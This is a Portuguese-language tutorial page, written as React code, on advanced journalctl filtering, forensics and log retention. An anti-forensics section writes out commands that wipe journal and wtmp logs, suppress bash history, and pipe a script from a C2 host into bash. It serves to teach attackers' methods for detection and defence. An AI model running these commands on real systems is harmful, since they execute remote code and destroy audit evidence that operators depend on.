import { PageContainer } from "@/components/layout/PageContainer";
import { AlertBox } from "@/components/ui/AlertBox";
import { CodeBlock } from "@/components/ui/CodeBlock";
import { CommandTable } from "@/components/ui/CommandTable";
import { PracticeBox } from "@/components/ui/PracticeBox";
import { Terminal } from "@/components/ui/Terminal";

export default function JournalCtl() {
  return (
    <PageContainer
      title="journalctl avançado"
      subtitle="Filtrar logs do systemd como um cirurgião — e (do lado ofensivo) saber como rastros são deixados e apagados."
      difficulty="intermediario"
      timeToRead="20 min"
    >
      <h2>O journal do systemd</h2>
      <p>
        O <strong>journald</strong> (PID daughter de systemd) substitui o velho
        <code> rsyslog</code> em distros modernas. Ele recebe logs do kernel, syslog,
        stdout/stderr de cada unit, e armazena em formato binário indexado em
        <code> /var/log/journal/</code> (persistente) ou <code>/run/log/journal/</code> (RAM).
        <code> journalctl</code> é o cliente que consulta isso.
      </p>

      <Terminal
        path="~"
        lines={[
          {
            cmd: "journalctl --version",
            out: "systemd 256 (256.7-2)",
            outType: "info",
          },
          {
            cmd: "journalctl --disk-usage",
            out: "Archived and active journals take up 1.4G in the file system.",
            outType: "default",
          },
          {
            cmd: "ls -la /var/log/journal/$(cat /etc/machine-id)/ | head -6",
            out: `total 1432008
drwxr-sr-x+ 2 root systemd-journal      4096 Apr  3 09:42 .
drwxr-sr-x+ 3 root systemd-journal      4096 Mar 12 11:21 ..
-rw-r-----+ 1 root systemd-journal  41943040 Apr  3 14:02 system.journal
-rw-r-----+ 1 root systemd-journal 188743680 Mar 30 18:33 system@a8e1f2c4d5b6.journal~
-rw-r-----+ 1 root systemd-journal  16777216 Apr  3 14:11 user-1000.journal`,
            outType: "muted",
          },
        ]}
      />

      <AlertBox type="info" title="Persistente vs volátil">
        Se <code>/var/log/journal/</code> existe, os logs sobrevivem ao reboot. Se não, vão
        para <code>/run/log/journal/</code> (tmpfs em RAM) e são apagados a cada boot.
        Para tornar persistente: <code>sudo mkdir -p /var/log/journal && sudo systemd-tmpfiles --create --prefix /var/log/journal</code>.
      </AlertBox>

      <h2>Filtros por unit, prioridade e tempo</h2>
      <CommandTable
        title="As flags que você usa todo dia"
        variations={[
          { cmd: "journalctl -u ssh", desc: "Logs do serviço ssh.", output: "Apr 03 09:12 kali sshd[12847]: Server listening on 0.0.0.0 port 22." },
          { cmd: "journalctl -u ssh -u nginx", desc: "Múltiplos units de uma vez.", output: "Concatena ordenado por tempo." },
          { cmd: "journalctl -u 'cron*' -u 'apt*'", desc: "Wildcards funcionam.", output: "Útil pra famílias de unit." },
          { cmd: "journalctl -b", desc: "Só boot atual (-b 0). -b -1 = boot anterior.", output: "Lista todos os boots: journalctl --list-boots" },
          { cmd: "journalctl -k", desc: "Só mensagens do kernel (= dmesg, mas com timestamp absoluto).", output: "Apr 03 08:42 kali kernel: Linux version 6.11.0-kali2-amd64 ..." },
          { cmd: "journalctl -p err", desc: "Prioridade err ou pior. Níveis: emerg(0) alert(1) crit(2) err(3) warning(4) notice(5) info(6) debug(7).", output: "Apr 03 09:11 sshd[12947]: error: maximum authentication attempts exceeded" },
          { cmd: "journalctl -p warning..err", desc: "Range de prioridades.", output: "Só warning e err (ignora info/debug)." },
          { cmd: "journalctl --since today", desc: "A partir de hoje 00:00.", output: "Aliases: yesterday, now, '2 hours ago'." },
          { cmd: "journalctl --since '2026-04-03 09:00' --until '2026-04-03 10:00'", desc: "Janela exata.", output: "Em IR é a forma de cortar 'durante o ataque'." },
          { cmd: "journalctl -f", desc: "Tail -f (acompanha em real-time).", output: "Ctrl+C pra sair." },
          { cmd: "journalctl -n 50", desc: "Últimas 50 entradas.", output: "Sem -n: tudo desde o começo." },
          { cmd: "journalctl --reverse", desc: "Mais recentes primeiro.", output: "Como ler email." },
        ]}
      />

      <h2>Combinando filtros</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "tudo de erro do ssh nas últimas 6 horas",
            cmd: "journalctl -u ssh -p err --since '6 hours ago'",
            out: `Apr 03 09:34:12 kali sshd[12947]: Failed password for invalid user admin from 192.168.1.50 port 51220 ssh2
Apr 03 09:34:14 kali sshd[12947]: Failed password for invalid user admin from 192.168.1.50 port 51220 ssh2
Apr 03 09:34:18 kali sshd[12947]: Disconnecting invalid user admin 192.168.1.50: Too many authentication failures`,
            outType: "error",
          },
          {
            comment: "kernel + segfaults (procurar exploit binário)",
            cmd: "journalctl -k --grep='segfault' --since today",
            out: `Apr 03 11:42:18 kali kernel: helper[14271]: segfault at 0 ip 00007f8a4b2c3104 sp 00007ffe9a8b1d20 error 6 in libc.so.6[7f8a4b297000+155000]`,
            outType: "warning",
          },
          {
            comment: "regex em qualquer mensagem",
            cmd: "journalctl --grep='Failed password' --since today | wc -l",
            out: "47",
            outType: "info",
          },
        ]}
      />

      <h2>Por usuário, por PID, por path</h2>
      <CommandTable
        title="Filtros menos óbvios mas poderosos"
        variations={[
          { cmd: "journalctl _UID=1000", desc: "Logs gerados por processos de UID 1000.", output: "Match exato." },
          { cmd: "journalctl _PID=14271", desc: "Tudo de um PID específico.", output: "Pra rastrear um implant." },
          { cmd: "journalctl _COMM=sshd", desc: "Filtra por nome do binário (campo COMM do kernel).", output: "Mais confiável que -u em alguns casos." },
          { cmd: "journalctl _SYSTEMD_UNIT=ssh.service", desc: "Por nome real da unit (= -u).", output: "Útil quando usa em combinação." },
          { cmd: "journalctl /usr/sbin/sshd", desc: "Logs gerados pelo binário deste path.", output: "Atalho equivalente a _EXE=." },
          { cmd: "journalctl --user", desc: "Logs do journal do USUÁRIO atual (não do sistema).", output: "Cada user tem o próprio journal." },
          { cmd: "journalctl --user-unit=tracker-miner-fs.service", desc: "Unit de usuário (~/.config/systemd/user/).", output: "Pra tools rodando como user." },
          { cmd: "journalctl _BOOT_ID=$(journalctl --list-boots | awk 'NR==2{print $2}')", desc: "Logs de um boot ID exato.", output: "Útil pra forense post-mortem." },
        ]}
      />

      <h2>Output formats</h2>
      <CommandTable
        title="-o (formato de saída)"
        variations={[
          { cmd: "-o short", desc: "Default: 'Mar 12 14:21:05 kali sshd[123]: msg'.", output: "Como /var/log/syslog antigo." },
          { cmd: "-o short-iso", desc: "Timestamp ISO completo com TZ.", output: "2026-04-03T14:21:05-0300 kali sshd[123]: msg" },
          { cmd: "-o short-precise", desc: "Microssegundos (.123456).", output: "Pra correlação fina." },
          { cmd: "-o verbose", desc: "TODOS os campos da entrada (gigante).", output: "_PID=, _UID=, _COMM=, _MACHINE_ID=, ..." },
          { cmd: "-o cat", desc: "Só a mensagem, sem prefixo.", output: "Pra parse com awk/cut." },
          { cmd: "-o json", desc: "Uma linha JSON por entrada.", output: "Pipe pra jq." },
          { cmd: "-o json-pretty", desc: "JSON indentado.", output: "Inspeção manual." },
          { cmd: "-o export", desc: "Formato binário (pode ser reimportado).", output: "Pra mover logs entre máquinas." },
        ]}
      />

      <Terminal
        path="~"
        lines={[
          {
            cmd: "journalctl -u ssh -n 1 -o json-pretty",
            out: `{
        "__CURSOR" : "s=8a7f...;i=1c4a;b=4d2...;m=82e7c0;t=63...;x=712...",
        "__REALTIME_TIMESTAMP" : "1743696018724182",
        "__MONOTONIC_TIMESTAMP" : "8581046976",
        "_BOOT_ID" : "4d2bc9e1f7a1483aa1c2b9d3e5f6a7b8",
        "_HOSTNAME" : "kali",
        "PRIORITY" : "3",
        "_UID" : "0",
        "_GID" : "0",
        "_SYSTEMD_UNIT" : "ssh.service",
        "_COMM" : "sshd",
        "_PID" : "12947",
        "MESSAGE" : "Failed password for invalid user admin from 192.168.1.50 port 51220 ssh2"
}`,
            outType: "info",
          },
          {
            comment: "JSON + jq para análise: top 10 IPs falhando senha SSH",
            cmd: "journalctl -u ssh -o json --since today | jq -r 'select(.MESSAGE | test(\"Failed password\")) | .MESSAGE' | grep -oE '([0-9]{1,3}\\.){3}[0-9]{1,3}' | sort | uniq -c | sort -rn | head",
            out: `     31 192.168.1.50
     12 10.10.14.99
      8 203.0.113.42
      4 198.51.100.7`,
            outType: "warning",
          },
        ]}
      />

      <h2>Ler logs de outro sistema (forense)</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "ler journal de uma imagem montada (post-mortem)",
            cmd: "journalctl -D /mnt/loot/var/log/journal --since '2026-04-03 09:00'",
            out: `(lê o journal da máquina comprometida sem precisar bootar ela)`,
            outType: "info",
          },
          {
            comment: "ler de arquivo específico",
            cmd: "journalctl --file /mnt/loot/var/log/journal/abc123.../system@xyz.journal~ -p err",
            out: `Apr 03 09:34:12 vitima sshd[12947]: Failed password for ...`,
            outType: "default",
          },
        ]}
      />

      <h2>Rotação e limpeza (lado defensivo)</h2>
      <CommandTable
        title="vacuum: gerenciar tamanho/idade do journal"
        variations={[
          { cmd: "sudo journalctl --vacuum-size=500M", desc: "Mantém só os últimos 500MB.", output: "Apaga arquivos arquivados (.journal~) mais antigos." },
          { cmd: "sudo journalctl --vacuum-time=7d", desc: "Mantém só 7 dias.", output: "Aceita s/m/h/d/M/year." },
          { cmd: "sudo journalctl --vacuum-files=5", desc: "Mantém só os 5 arquivos mais novos.", output: "Vacuuming done, freed 412.7M." },
          { cmd: "sudo journalctl --rotate", desc: "Força rotação imediata.", output: "Cria novo system.journal e arquiva o atual." },
          { cmd: "sudo journalctl --flush", desc: "Move logs de /run para /var/log/journal/.", output: "Necessário 1x após habilitar persistente." },
        ]}
      />

      <CodeBlock
        language="ini"
        title="/etc/systemd/journald.conf — limites globais"
        code={`[Journal]
Storage=persistent
Compress=yes
SystemMaxUse=2G
SystemKeepFree=500M
SystemMaxFileSize=128M
SystemMaxFiles=20
RuntimeMaxUse=200M
ForwardToSyslog=no
MaxRetentionSec=1month
MaxLevelStore=info`}
      />

      <p>
        Após editar: <code>sudo systemctl restart systemd-journald</code>.
      </p>

      <h2 id="antiforense">Apagar rastros (anti-forense ofensivo)</h2>
      <p className="text-yellow-400/90 font-semibold">
        ATENÇÃO: técnicas a seguir são para entender o lado ofensivo / saber o que detectar.
        Use SOMENTE em ambiente autorizado (lab próprio, CTF, contrato de Red Team com escopo escrito).
      </p>

      <h3>O óbvio: deletar tudo</h3>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "sudo journalctl --rotate",
            out: "(força arquivo atual a virar .journal~ e cria novo)",
            outType: "muted",
          },
          {
            cmd: "sudo journalctl --vacuum-time=1s",
            out: `Vacuuming done, freed 1.4G of archived journals from /var/log/journal/abc123...`,
            outType: "warning",
          },
          {
            comment: "ou apagar manualmente (mais bruto)",
            cmd: "sudo rm /var/log/journal/$(cat /etc/machine-id)/*.journal*",
            out: "(silencioso — journald cria novo automaticamente)",
            outType: "error",
          },
        ]}
      />

      <AlertBox type="danger" title="O óbvio é detectável">
        Apagar TODOS os logs deixa um buraco gritante: a próxima entrada após a limpeza
        terá timestamp horas/dias depois da anterior. SOC com baseline detecta na hora.
        Em Red Team profissional, técnicas mais elegantes:
        <ul className="list-disc pl-5 mt-2">
          <li>Stop journald, edite arquivos e reinicie (preserva continuidade).</li>
          <li>Apenas remover linhas específicas (precisa parsear formato binário — ferramentas como <code>jrnl-tamper</code>).</li>
          <li>Forward logs para o atacante via <code>systemd-journal-upload</code> e bloquear armazenamento local.</li>
          <li>Comprometer o central log server (a única defesa real é envio em real-time).</li>
        </ul>
      </AlertBox>

      <h3>Bash history também conta como log</h3>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "unset HISTFILE; export HISTFILE=/dev/null; history -c",
            out: "(comandos da sessão atual nunca chegam ao disco)",
            outType: "muted",
          },
          {
            comment: "ou trabalhar com 'space-prefix' (HISTCONTROL=ignorespace é default no Kali)",
            cmd: " curl -s http://10.10.14.5/c2 | bash",
            out: "(comando começando com espaço NÃO entra no history)",
            outType: "warning",
          },
        ]}
      />

      <h3>Wtmp / btmp / lastlog</h3>
      <Terminal
        path="~"
        lines={[
          {
            comment: "logs de login (wtmp), logins falhos (btmp), último login por user (lastlog)",
            cmd: "last -n 5",
            out: `wallyson pts/1        10.10.14.5       Fri Apr  3 14:50   still logged in
wallyson pts/0        :0               Fri Apr  3 08:43   still logged in
reboot   system boot  6.11.0-kali2-amd Fri Apr  3 08:42   still running
wallyson pts/0        :0               Thu Apr  2 09:11 - 23:48 (14:37)`,
            outType: "default",
          },
          {
            cmd: "sudo lastb -n 5",
            out: `admin    ssh:notty    192.168.1.50    Fri Apr  3 09:34 - 09:34  (00:00)
admin    ssh:notty    192.168.1.50    Fri Apr  3 09:34 - 09:34  (00:00)
admin    ssh:notty    192.168.1.50    Fri Apr  3 09:34 - 09:34  (00:00)`,
            outType: "warning",
          },
          {
            comment: "limpar entrada específica do wtmp (precisa root)",
            cmd: "sudo utmpdump /var/log/wtmp | grep -v '10.10.14.5' | sudo utmpdump -r > /var/log/wtmp",
            out: "(reescreve sem as linhas do IP do atacante — clássico)",
            outType: "error",
          },
        ]}
      />

      <h2>Watchdog do defender — checklist</h2>
      <CommandTable
        title="Indícios de tampering no journal"
        variations={[
          { cmd: "journalctl --verify", desc: "Verifica integridade dos arquivos do journal.", output: "PASS / FAIL com FSS (Forward Secure Sealing)." },
          { cmd: "journalctl --setup-keys", desc: "Habilita FSS — gera chave de selo (depois precisa journalctl --verify).", output: "Crítico em servidor de produção." },
          { cmd: "journalctl --since '@$(($(date +%s)-300))'", desc: "Últimos 5 min — confere se há atividade.", output: "Buracos = suspeita." },
          { cmd: "stat /var/log/journal/*/system.journal", desc: "Compare mtime/atime: alteração recente?", output: "Modify: 2026-04-03 14:55 (5 min atrás) — esperado." },
          { cmd: "journalctl --list-boots | wc -l", desc: "Conta boots históricos.", output: "Reset súbito = alguém apagou tudo." },
        ]}
      />

      <PracticeBox
        title="Investigar uma janela de ataque"
        goal="Dada uma suspeita de comprometimento entre 09:30 e 10:00, extrair tudo relevante."
        steps={[
          "Pegue todas as falhas de auth do SSH no intervalo.",
          "Identifique IPs únicos atacando.",
          "Liste comandos sudo executados na janela.",
          "Extraia segfaults do kernel (possível exploit binário).",
          "Salve tudo em um caso/journal-evidencia.txt para o relatório.",
        ]}
        command={`SINCE='2026-04-03 09:30'
UNTIL='2026-04-03 10:00'
OUT=caso/journal-evidencia.txt
mkdir -p caso

{
  echo "=== Falhas de SSH ==="
  journalctl -u ssh --since "$SINCE" --until "$UNTIL" --grep='Failed|Invalid'

  echo
  echo "=== IPs unicos ==="
  journalctl -u ssh --since "$SINCE" --until "$UNTIL" --grep='Failed|Invalid' \\
    | grep -oE '([0-9]{1,3}\\.){3}[0-9]{1,3}' | sort -u

  echo
  echo "=== Sudo na janela ==="
  journalctl _COMM=sudo --since "$SINCE" --until "$UNTIL"

  echo
  echo "=== Segfaults no kernel ==="
  journalctl -k --since "$SINCE" --until "$UNTIL" --grep='segfault'
} | tee "$OUT"`}
        expected={`=== Falhas de SSH ===
Apr 03 09:34:12 kali sshd[12947]: Failed password for invalid user admin from 192.168.1.50 port 51220 ssh2
Apr 03 09:34:18 kali sshd[12947]: Disconnecting invalid user admin

=== IPs unicos ===
192.168.1.50
10.10.14.5

=== Sudo na janela ===
Apr 03 09:51:22 kali sudo[14102]: wallyson : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash

=== Segfaults no kernel ===
Apr 03 09:48:11 kali kernel: pwn[14081]: segfault at 0 ip 00007f...`}
        verify="O arquivo caso/journal-evidencia.txt deve conter as 4 seções não vazias. Use isso como anexo no relatório de incidente."
      />

      <AlertBox type="success" title="Logs em log central salvam vidas">
        A defesa de verdade contra anti-forense é <strong>shipping em tempo real</strong>:
        <code> journald</code> com <code>ForwardToSyslog=yes</code> + <code>rsyslog</code> ou
        <code> systemd-journal-upload</code> mandando para um SIEM (Wazuh, Graylog, Splunk).
        Uma vez que o log saiu do host, apagar local não adianta nada.
      </AlertBox>
    </PageContainer>
  );
}
